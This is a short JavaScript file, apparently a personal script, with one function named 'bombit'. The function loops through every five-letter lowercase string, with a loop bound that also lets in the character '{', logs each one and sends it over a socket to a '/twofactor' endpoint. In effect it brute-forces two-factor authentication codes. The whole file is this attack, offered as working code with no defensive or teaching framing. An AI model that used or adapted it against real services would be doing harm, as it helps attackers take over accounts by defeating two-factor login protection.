/**
 * Created by Alex on 1/9/2016.
 */
function bombit()
{
    for (var one = 97; one <= 123; one++)
    {
        for (var two = 97; two <= 123; two++)
        {
            for (var three = 97; three <= 123; three++)
            {
                for (var four = 97; four <= 123; four++)
                {
                    for (var five = 97; five <= 123; five++)
                    {
                        var str = "" + String.fromCharCode(one)+String.fromCharCode(two)+String.fromCharCode(three)+String.fromCharCode(four)+String.fromCharCode(five);
                        console.log(str);
                        socket.emit('/twofactor',str);
                    }
                }
            }
        }
    }
}